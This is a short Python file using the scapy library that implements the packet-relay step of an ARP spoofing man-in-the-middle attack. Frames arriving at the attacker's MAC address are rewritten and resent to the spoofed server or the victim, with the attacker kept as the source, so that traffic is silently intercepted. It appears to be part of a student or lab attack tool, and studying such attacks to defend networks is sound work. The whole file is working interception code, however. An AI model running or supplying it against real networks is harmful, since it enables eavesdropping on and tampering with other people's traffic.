from scapy.all import *
from scapy.layers.inet import IP

# Func gets pkt from ARP class which then forwards or not depending on ARP mode(var: forward)
def interceptARP(pkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface, forward):

    # case 1: victim requests an IP which has as destination MAC of attacker
    # find corresponding MAC to that IP in array of spoofed IPs and
    # put as destination to the new packet
    if pkt[Ether].dst == attackerMAC:
        if pkt.haslayer(IP):
            if pkt[IP].dst in spoofIP:
                pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
            else:
                # case 2: server response for the request of the victim
                # so replace destination MAC to the MAC of victim
                pkt[Ether].dst = victimMAC

            # put src to attackerMAC as both arp tables of server and victim
            # maintain requested IP andresses under attacker MAC
            pkt[Ether].src = attackerMAC


            # send packet to the network only if forward is True
            if forward:
                sendp(pkt, iface=networkInterface, verbose=0)
